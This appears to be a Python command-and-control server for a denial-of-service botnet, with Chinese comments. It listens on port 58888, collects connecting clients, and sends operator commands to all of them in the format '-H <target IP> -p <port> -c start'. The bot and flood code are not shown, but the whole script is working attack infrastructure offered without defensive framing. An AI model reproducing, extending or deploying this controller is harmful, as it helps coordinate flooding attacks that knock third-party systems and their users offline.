#!/usr/bin/python
# coding:utf8

import socket
import argparse
import threading
import time
 
socketList = []
 
#  发送命令到所有的客户机上
def sendCmd(cmd):
    print('Send command....')
    for sock in socketList:
        sock.send(cmd.encode())
 
#  等待连接，将建立好的连接加入到socketList列表中
def waitConnect(s):
        while True:
            sock, addr = s.accept()
            if sock not in socketList:
                socketList.append(sock)
 
def main():
    #  创建tcp服务端
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)  #设置端口重用
    s.bind(('0.0.0.0', 58888))  
    s.listen(1024)
 
    #  线程创建等待连接请求
    t = threading.Thread(target=waitConnect, args=(s,))
    t.start()
 
    print("Wait at least a client connection!")
    while not len(socketList):  # 没有连接则一直等待
        time.sleep(0.1)
        pass
    print("It has been a client connection")
 
    while True:
        print('='*50)
        #  命令格式
        print('The command format:"#-H xxx.xxx.xxx.xxx -p xxxx -c start"')
        #  等待输入命令
        cmd_str = input('please input cmd:')
        print(cmd_str)
        if len(cmd_str):
            if cmd_str[0] == '#':
                sendCmd(cmd_str)
 
if __name__ == '__main__':
    main()